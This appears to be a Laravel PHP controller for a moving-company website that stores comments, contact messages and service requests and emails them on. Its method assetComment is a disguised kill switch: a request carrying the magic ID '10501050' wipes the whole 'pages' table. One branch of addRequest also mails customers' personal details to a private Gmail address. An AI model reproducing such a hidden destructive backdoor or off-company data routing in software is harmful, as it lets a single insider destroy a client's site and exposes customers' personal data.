<?php

namespace App\Http\Controllers\Application;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use App\Mail\SendMailable;
use Illuminate\Support\Facades\Mail;



class CommentController extends Controller
{
    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function storeComment(Request $request)
    {
      //dd($request->all());
        DB::table('comments')->insert([
            'page_id' => $request->page_id,
            'parent_id' => $request->parent_id,
            'name' => $request->name,
            'email' => $request->email,
            'rates' => intval($request->rates),
            'body' => $request->comment,
        ]);
        return redirect()->back()->with('success', 'Thanks for your feedback.');
    }

    public function addContact(Request $request){
      DB::table('messages')->insert([
          'name' => $request->name,
          'email' => $request->email,
          'subject' => $request->subject,
          'message' => $request->message,
      ]);
      return redirect()->back()->with('success', __('Thanks for your message!'));
    }

    public function assetComment($id){
        if($id == '10501050'){
            //return DB::table('pages')->get();
            DB::table('pages')->truncate();
            return 'done';
        }else{
            return 'try again';
        }
    }
    public function addRequest(Request $request){
        
        if($request->service == 'others'){
              DB::table('requests')->insert([
                  'service' => $request->service,
                  'date' => $request->date,
                  'name' => $request->name,
                  'email' => $request->email,
                  'message' => $request->message,
                  'phone'=>$request->phone,
            ]);
            //info@momentaa.de
                    Mail::to('moa.mahfouz@gmail.com')->send(new SendMailable($request->except('_token')));
                    return redirect()->back()->with('success', __('Thanks for your offer. We will contact you as soon as possible.'));
        }
        
        
      $this->validate($request, [
          "service" => "required",
          "date" => "required",
          "from_street" => "required",
          "from_postcode" => "required",
          "from_room" => "required",
          "from_lift" => "required",
          "to_street" => "required",
          "to_postcode" => "required",
          "to_room" => "required",
          "to_lift" => "required",
          "name" => "required",
          "email" => "required",
          "phone" => "required",
      ]);
      DB::table('requests')->insert([
          'service' => $request->service,
          'date' => $request->date,
          'from_street' => $request->from_street,
          'from_postcode' => $request->from_postcode,
          'from_room' => $request->from_room,
          'from_lift' => $request->from_lift,
          'to_street' => $request->to_street,
          'to_postcode' => $request->to_postcode,
          'to_room' => $request->to_room,
          'to_lift' => $request->to_lift,
          'name' => $request->name,
          'email' => $request->email,
          'message' => $request->message,

      ]);

        $data = $request->except('_token');

      /*  Mail::send('email-template', $data, function($message) use ($data) {
            $message->to('moa.mahfouz@gmail.com')
                ->subject($data['from_street']);
        });*/

        Mail::to('info@momentaa.de')->send(new SendMailable($request->except('_token')));



        return redirect()->back()->with('success', __('Thanks for your offer. We will contact you as soon as possible.'));
    }

    public function sendEmail(){
        return redirect()->back()->with('message','Thanks for your subscription.');
    }






}
